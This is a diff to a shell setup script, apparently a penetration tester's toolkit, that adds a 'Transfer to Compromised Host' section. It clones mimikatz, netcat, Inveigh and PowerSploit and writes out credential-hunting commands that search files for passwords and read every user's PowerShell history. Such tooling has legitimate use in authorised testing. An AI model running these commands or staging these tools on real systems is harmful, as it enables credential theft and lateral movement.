@@ -253,6 +253,41 @@ if [ ! -d ~/WindowsTools ]; then
 fi
 
 #===============================================================================
+# WINDOWS TOOLING (Transfer to Compromised Host) ===============================
+#===============================================================================
+if [ ! -d ~/WindowsNative ]; then
+    # mimikatz
+    mkdir -p ~/WindowsNative/mimikatz
+    git clone https://github.com/ParrotSec/mimikatz.git ~/WindowsNative/mimikatz
+    echo "[+] Mimikatz Added" >> ~/Report.txt
+    
+    # netcat
+    mkdir -p ~/WindowsNative/netcat
+    git clone https://github.com/int0x33/nc.exe.git ~/WindowsNative/netcat
+    echo "[+] Netcat Added" >> ~/Report.txt
+
+    # inveigh
+    mkdir -p ~/WindowsNative/inveigh
+    git clone https://github.com/Kevin-Robertson/Inveigh.git ~/WindowsNative/inveigh
+    echo "[+] Inveigh Added" >> ~/Report.txt
+
+    # powersploit (RECON -> Then Upload PowerView.ps1)
+    mkdir -p ~/WindowsNative/powersploit
+    git clone https://github.com/PowerShellMafia/PowerSploit.git ~/WindowsNative/powersploit
+    echo "[+] PowerSploit Added" >> ~/Report.txt
+
+    # Manual Credential Hunting
+    # echo "" >> ~/WindowsNative/CredentialHunting.txt
+    echo 'findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml' > ~/WindowsNative/CredentialHunting.txt
+    echo 'findstr /SI /M "password" *.xml *.ini *.txt' >> ~/WindowsNative/CredentialHunting.txt
+    echo 'findstr /si password *.xml *.ini *.txt *.config' >> ~/WindowsNative/CredentialHunting.txt
+    echo 'findstr /spin "password" *.*' >> ~/WindowsNative/CredentialHunting.txt
+    echo 'dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*' >> ~/WindowsNative/CredentialHunting.txt
+    echo 'where /R C:\ *.config' >> ~/WindowsNative/CredentialHunting.txt
+    echo 'foreach($user in ((ls C:\users).fullname)){cat "$user\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadline\ConsoleHost_history.txt" -ErrorAction SilentlyContinue}' >> ~/WindowsNative/CredentialHunting.txt
+fi
+
+#===============================================================================
 # PIVOTING TOOLING =============================================================
 #===============================================================================
 if [ ! -d ~/PivotingTools ]; then
